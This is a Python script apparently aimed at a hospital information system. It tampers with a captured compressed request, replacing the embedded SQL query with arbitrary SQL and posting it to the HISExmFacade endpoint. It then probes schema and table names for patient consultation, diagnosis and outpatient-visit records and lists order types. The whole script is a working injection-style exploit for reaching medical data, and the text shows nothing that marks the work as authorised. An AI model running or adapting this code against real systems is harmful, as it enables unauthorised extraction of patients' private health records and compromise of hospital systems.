from his_client_final import HISClient
import sys, re

if sys.platform == "win32":
    sys.stdout.reconfigure(encoding='utf-8')

c = HISClient()

def execute_sql(sql_query):
    import zlib, os, requests
    template_path = "HISExmFacade_payload_0.bin"
    if not os.path.exists(template_path): return None
    with open(template_path, "rb") as f:
        compressed_template = f.read()
    try: decompressed = zlib.decompress(compressed_template)
    except: decompressed = compressed_template
    original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
    target_len = len(original_sql_bytes)
    padded_sql = sql_query.ljust(target_len)
    patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
    resp = requests.post(f"{c.base_url}/HISExmFacade", data=zlib.compress(patched_payload), headers=c.headers)
    if resp.status_code == 200:
        return zlib.decompress(resp.content).decode('utf-8', errors='ignore')
    return None

def parse_rows(text, tag="DRMODIFY"):
    if not text: return []
    rows = re.findall(f'<{tag}[^>]*>(.*?)</{tag}>', text, re.DOTALL)
    out = []
    for r in rows:
        fields = re.findall(r'<(\w+)>(.*?)</\1>', r)
        out.append({k: v for k, v in fields})
    return out

probes = [
    'SYSTEM.PAT_CONSULTATION',
    'OPDUSR.PAT_CONSULTATION',
    'CPOE.CONSULTATION',
    'SYSTEM.PAT_DIAGNOSIS',
    'OPDUSR.PAT_DIAGNOSIS',
    'CPOE.PAT_DIAGNOSIS',
    'SYSTEM.OPD_DIAGNOSIS',
    'OPDUSR.OPD_DIAGNOSIS',
    'SYSTEM.PAT_OPD_DIAG',
    'OPDUSR.PAT_OPD_DIAG',
    'SYSTEM.PAT_OPD_CASE',
    'SYSTEM.PAT_OPD_VISIT'
]

for p in probes:
    print(f"[*] Probing {p}...")
    try:
        res = execute_sql(f"SELECT * FROM {p} WHERE ROWNUM <= 1")
        if res and '<NewDataSet>' in res:
            print(f"  [+] SUCCESS: {p}")
            rows = parse_rows(res)
            if rows: print(f"    - Keys: {rows[0].keys()}")
    except: pass

# Try querying OPDORDM for consultations
print("\n[*] Checking OPDORDM for ORTYPE like 'CONS'...")
q = "SELECT DISTINCT ORTYPE FROM OPDUSR.OPDORDM WHERE ORTYPE LIKE '%CON%' OR ORTYPE LIKE '%CSL%'"
res = execute_sql(q)
rows = parse_rows(res)
for r in rows:
    print(f"  Found Type: {r.get('ORTYPE')}")
